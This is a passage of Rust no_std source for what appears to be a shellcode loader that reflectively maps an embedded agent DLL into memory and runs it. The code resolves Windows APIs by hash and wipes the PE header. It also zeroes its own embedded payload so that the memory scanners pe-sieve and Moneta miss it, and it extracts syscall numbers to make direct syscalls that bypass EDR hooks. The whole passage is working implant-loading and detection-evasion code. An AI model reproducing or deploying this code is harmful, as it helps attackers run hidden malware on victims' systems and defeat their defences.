                    iat_rva2   += mem::size_of::<usize>();
                }
                desc_ptr2 = desc_ptr2.add(1);
            }
        }
    } else {
        sc_log(k32, b"[lpe] StratumCreateThread not found\0".as_ptr());
    }
    // OEP absolute address — needed only for fallback path.
    let oep_abs: *mut c_void = {
        let rva = opt.address_of_entry_point as usize;
        if rva != 0 { (base + rva) as *mut c_void } else { ptr::null_mut() }
    };

    // Allocate a small TLS info block to pass to StratumRun. The block contains
    // three pointer-sized values needed to initialise per-thread TLS storage:
    //   [0] addr_of_index   — VA of the DWORD holding the TLS slot index (in .data)
    //   [1] tls_template_va — VA of start of TLS template data (in .tls)
    //   [2] tls_template_sz — size in bytes of the TLS template
    // These are VAs in the *loaded* image (already rebased), so they survive the
    // PE header wipe. The block is allocated with RW permissions; StratumRun reads
    // it in agent_thread_entry before any Rust thread-local access.
    // Build tls_info_block whenever the image has a TLS directory (not just callbacks).
    // The block holds the three values needed to initialise the TLS block for each
    // new thread (since Windows skips DLL_THREAD_ATTACH for reflectively loaded DLLs).
    let tls_rva_entry = opt.data_directory[IMAGE_DIRECTORY_ENTRY_TLS].virtual_address;
    let tls_info_block: *mut usize = if tls_rva_entry != 0 {
        let tls_dir = &*((base + tls_rva_entry as usize) as *const ImageTlsDirectory64);
        let template_sz = tls_dir.end_address_of_raw_data.wrapping_sub(tls_dir.start_address_of_raw_data) as usize;
        if template_sz > 0 && tls_dir.address_of_index != 0 {
            let blk = virtual_alloc(
                ptr::null_mut(), 24, MEM_COMMIT_RESERVE, PAGE_READWRITE,
            ) as *mut usize;
            if !blk.is_null() {
                *blk.add(0) = tls_dir.address_of_index as usize;
                *blk.add(1) = tls_dir.start_address_of_raw_data as usize;
                *blk.add(2) = template_sz;
                sc_log(k32, b"[lpe] TLS info block allocated\0".as_ptr());
            }
            blk
        } else {
            ptr::null_mut()
        }
    } else {
        ptr::null_mut()
    };

    if p_sr.is_null() {
        sc_log(k32, b"[lpe] WARN: StratumRun not found\0".as_ptr());
    } else {
        sc_log(k32, b"[lpe] StratumRun found\0".as_ptr());
    }

    // ── 11. Wipe PE header ────────────────────────────────────────────────────
    let wipe_size = opt.size_of_headers as usize;
    memset_raw(image_base as *mut u8, 0, wipe_size.min(0x1000));

    // ── 12. Run DLL CRT initialisers, then call StratumRun ───────────────────
    // StratumCrtInit walks __xi_a..__xi_z and __xc_a..__xc_z so that Rust's
    // panic handler, thread-local infrastructure, and all static initialisers
    // are set up before any Rust code in the DLL runs.
    if !p_ci.is_null() {
        sc_log(k32, b"[lpe] calling StratumCrtInit\0".as_ptr());
        type FnCrtInit = unsafe extern "win64" fn();
        let ci: FnCrtInit = mem::transmute(p_ci);
        ci();
        sc_log(k32, b"[lpe] StratumCrtInit done\0".as_ptr());
    } else {
        sc_log(k32, b"[lpe] StratumCrtInit not found\0".as_ptr());
    }

    if !p_sr.is_null() {
        sc_log(k32, b"[lpe] calling StratumRun\0".as_ptr());
        // Pass tls_info_block so each new thread can init its TLS storage before
        // any Rust thread-local access. Windows skips DLL_THREAD_ATTACH for
        // reflectively loaded DLLs — without this, TLS slots are NULL on new threads.
        type FnStratumRun = unsafe extern "win64" fn(*mut c_void) -> Dword;
        let sr: FnStratumRun = mem::transmute(p_sr);
        sr(tls_info_block as *mut c_void);
        sc_log(k32, b"[lpe] StratumRun returned (unexpected)\0".as_ptr());
        return 99;
    }

    // ── 13. Fallback: no StratumRun — call OEP directly ──────────────────────
    sc_log(k32, b"[lpe] no StratumRun, calling OEP directly\0".as_ptr());
    let oep_rva = opt.address_of_entry_point as usize;
    if oep_rva != 0 {
        let entry: FnDllMain = mem::transmute(base + oep_rva);
        entry(image_base as Handle, DLL_PROCESS_ATTACH, ptr::null_mut());
    }
    sc_log(k32, b"[lpe] OEP returned\0".as_ptr());

    if !p_ath.is_null() {
        let ath_ptr = p_ath as *const usize;
        let mut agent_handle: usize = 0;
        for _ in 0..5000usize {
            agent_handle = ptr::read_volatile(ath_ptr);
            if agent_handle != 0 { break; }
            sleep_fn(1);
        }
        if agent_handle == 0 {
            sc_log(k32, b"[lpe] ERR11 ATH never written\0".as_ptr());
            return 11;
        }
        sc_log(k32, b"[lpe] agent thread running OK (fallback)\0".as_ptr());
        return 0;
    }
    sc_log(k32, b"[lpe] ERR10 ATH export missing\0".as_ptr());
    10
}

// ── Wipe the embedded PE from .rodata after loading ───────────────────────────
// PE_DATA lives in the .rodata section of the shellcode blob itself (read-only).
// After load_pe() copies and maps the PE into a fresh memory region, the original
// bytes remain readable in the loader's .rodata — visible to memory scanners like
// pe-sieve or Moneta that dump and inspect all memory regions of the process.
//
// This is a post-execution behavioral detection surface: the loader cannot do this
// for us because only we know where PE_DATA lives at runtime.
//
// Fix: temporarily make the .rodata page RW via VirtualProtect, zero the bytes,
// then restore the original protection. The loaded agent is already running from
// its own VirtualAlloc'd region and is unaffected.
unsafe fn wipe_embedded_pe(virtual_protect: FnVirtualProtect) {
    let ptr  = PE_DATA.as_ptr() as LpVoid;
    let len  = PE_DATA.len();
    if len == 0 { return; }

    let mut old_prot: Dword = 0;

    // Make the .rodata region writable
    if virtual_protect(ptr, len, PAGE_READWRITE, &mut old_prot) == 0 {
        return; // VirtualProtect failed — leave as-is, do not crash
    }

    // Overwrite with zeros — volatile to prevent dead-store elimination by LLVM
    memset_volatile(ptr as *mut u8, 0, len);

    // Restore original protection (typically PAGE_READONLY = 0x02)
    virtual_protect(ptr, len, old_prot, &mut old_prot);
}


// ── agent thread (runs the loader) ────────────────────────────────────────────
// #[no_mangle] prevents LTO from eliminating this function (and PE_DATA with it)
// even though it is only referenced via a raw function pointer in inline asm.
#[no_mangle]
unsafe extern "win64" fn agent_thread(_: LpVoid) -> Dword {
    // SAFETY: This entire function may be called with a bad or null pointer.
    // We guard against AV by returning an exit code instead of panicking.

    let k32 = find_module(MOD_KERNEL32);
    if k32.is_null() { return 1; }
    if (k32 as usize) < 0x10000 { return 100; }
    sc_log(k32, b"[at] k32 found\0".as_ptr());

    let p_va = get_proc_by_hash(k32, H_VIRTUAL_ALLOC);         if p_va.is_null() { sc_log(k32, b"[at] ERR2 no VA\0".as_ptr()); return 2; }
    let p_vp = get_proc_by_hash(k32, H_VIRTUAL_PROTECT);       if p_vp.is_null() { sc_log(k32, b"[at] ERR3 no VP\0".as_ptr()); return 3; }
    let p_ll = get_proc_by_hash(k32, H_LOAD_LIBRARY);          if p_ll.is_null() { sc_log(k32, b"[at] ERR4 no LL\0".as_ptr()); return 4; }
    let p_gp = get_proc_by_hash(k32, H_GET_PROC_ADDR);         if p_gp.is_null() { sc_log(k32, b"[at] ERR5 no GP\0".as_ptr()); return 5; }
    let p_ta = get_proc_by_hash(k32, H_TLS_ALLOC);             if p_ta.is_null() { sc_log(k32, b"[at] ERR6 no TA\0".as_ptr()); return 6; }
    let p_sl = get_proc_by_hash(k32, H_SLEEP);                 if p_sl.is_null() { sc_log(k32, b"[at] ERR7 no SL\0".as_ptr()); return 7; }
    let p_ct = get_proc_by_hash(k32, H_CREATE_THREAD); // may be null — soft failure
    sc_log(k32, b"[at] APIs resolved\0".as_ptr());
    let virtual_alloc:    FnVirtualAlloc         = mem::transmute(p_va);
    let virtual_protect:  FnVirtualProtect       = mem::transmute(p_vp);
    let load_library:     FnLoadLibraryA         = mem::transmute(p_ll);
    let get_proc_addr:    FnGetProcAddress       = mem::transmute(p_gp);
    let tls_alloc:        FnTlsAlloc             = mem::transmute(p_ta);
    let sleep_fn:         FnSleep                = mem::transmute(p_sl);

    sc_log(k32, b"[at] calling load_pe\0".as_ptr());
    let result = load_pe(
        PE_DATA.as_ptr(),
        PE_DATA.len(),
        k32,
        virtual_alloc,
        virtual_protect,
        load_library,
        get_proc_addr,
        tls_alloc,
        sleep_fn,
        p_ct,
    );

    wipe_embedded_pe(virtual_protect);

    if result != 0 {
        sc_log(k32, b"[at] load_pe failed\0".as_ptr());
        return result;
    }
    sc_log(k32, b"[at] load_pe succeeded\0".as_ptr());
    0
}

// ── blob entry thunk ──────────────────────────────────────────────────────────
// global_asm! emits the thunk directly into .text._start which the linker
// script places at offset 0 of the flat binary.
// The assembler resolves the jmp target (_start_impl) as a rel32 offset at
// link time — correct because both symbols live in the same binary image.
// This is fully PIC: the jmp is RIP-relative (E9 <rel32>), no absolute addr.
core::arch::global_asm!(
    ".section .text._start, \"ax\"",
    ".global _start",
    "_start:",
    "jmp _start_impl",
);

// ── SSN extraction + direct syscall ──────────────────────────────────────────
// EDR hooks ntdll exports by patching the first bytes with a JMP to their
// trampoline. The SSN is at offset 4 of an unhooked NT stub:
//   4C 8B D1        mov r10, rcx
//   B8 XX XX 00 00  mov eax, <SSN>
//   0F 05           syscall
//
// If the stub is hooked, scan adjacent stubs (ordered alphabetically in ntdll,
// SSNs are contiguous) until an unhooked one is found, then adjust by offset.
// Returns 0xFFFF on failure.
unsafe fn extract_ssn(fn_ptr: *const u8) -> u32 {
    if *fn_ptr == 0x4C && *fn_ptr.add(3) == 0xB8 {
        let lo = *fn_ptr.add(4) as u32;
        let hi = *fn_ptr.add(5) as u32;
        return lo | (hi << 8);
    }
    for delta in 1u32..=32 {
        for sign in [1i32, -1i32] {
            let probe = fn_ptr.offset((delta as isize) * sign as isize * 32);
            if *probe == 0x4C && *probe.add(3) == 0xB8 {
                let lo = *probe.add(4) as u32;
                let hi = *probe.add(5) as u32;
                let n = lo | (hi << 8);
                return if sign > 0 { n.wrapping_sub(delta) } else { n.wrapping_add(delta) };
            }
        }
    }
    0xFFFF
}

// Direct syscall for NtCreateThreadEx (11 args).
// SSN arrives in r11 (set by caller); stack already laid out by caller per
// Windows x64 ABI (shadow space + 7 extra args above it).
#[unsafe(naked)]
unsafe extern "win64" fn do_syscall_NtCreateThreadEx(
    thread_handle:  usize, // rcx — *mut Handle
    desired_access: usize, // rdx
    obj_attrs:      usize, // r8
    process_handle: usize, // r9
    // stack (above shadow space at rsp+0x28..):
    start_routine:  usize,
    argument:       usize,
    create_flags:   usize,
    zero_bits:      usize,
    stack_size:     usize,
    max_stack_size: usize,
    attr_list:      usize,
) -> i32 {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov eax, r11d",
        "syscall",
        "ret",
    );
}

// Direct syscall for NtWaitForSingleObject (3 args).
#[unsafe(naked)]
unsafe extern "win64" fn do_syscall_NtWaitForSingleObject(
    handle:    usize, // rcx
    alertable: usize, // rdx
    timeout:   usize, // r8
) -> i32 {
    core::arch::naked_asm!(
        "mov r10, rcx",
        "mov eax, r11d",
        "syscall",
        "ret",
    );
}

// ── shellcode entry point ─────────────────────────────────────────────────────
#[no_mangle]
pub unsafe extern "win64" fn _start_impl(_param: *mut c_void) -> Dword {
    let result = agent_thread(ptr::null_mut());

    if result == 0 {
        let k32 = find_module(MOD_KERNEL32);
        if !k32.is_null() {
            sc_log(k32, b"[si] success, sleeping\0".as_ptr());
            let p_sl = get_proc_by_hash(k32, H_SLEEP);
            if !p_sl.is_null() {
                let sleep_fn: FnSleep = mem::transmute(p_sl);
                loop { sleep_fn(3_600_000); }
            }
        }
        loop { core::arch::asm!("nop"); }
    }

    result
}

// ── no_std boilerplate ────────────────────────────────────────────────────────
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! { loop {} }
